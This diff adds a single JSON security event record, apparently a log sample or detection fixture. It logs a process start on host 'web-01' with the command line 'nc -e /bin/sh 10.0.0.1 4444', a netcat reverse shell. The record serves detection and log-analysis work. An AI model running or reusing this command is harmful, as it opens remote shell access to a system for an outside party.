@@ -1,0 +1,33 @@
+{
+  "timestamp": "2026-06-17T12:00:01Z",
+  "event": {
+    "id": "d94065931d697ba3c00d2748541bcec4915ef49554229106593fb7849025740d",
+    "kind": "event",
+    "category": "process",
+    "action": "process_started",
+    "outcome": "success",
+    "severity": 3
+  },
+  "host": {
+    "name": "web-01"
+  },
+  "source": {
+    "ip": null,
+    "port": null,
+    "user": null
+  },
+  "destination": {
+    "ip": null,
+    "port": null,
+    "user": null
+  },
+  "process": {
+    "pid": 4242,
+    "ppid": 1000,
+    "name": "nc",
+    "executable": "/usr/bin/nc",
+    "command_line": "nc -e /bin/sh 10.0.0.1 4444"
+  },
+  "file": null,
+  "message": "process_started: pid=4242 nc"
+}
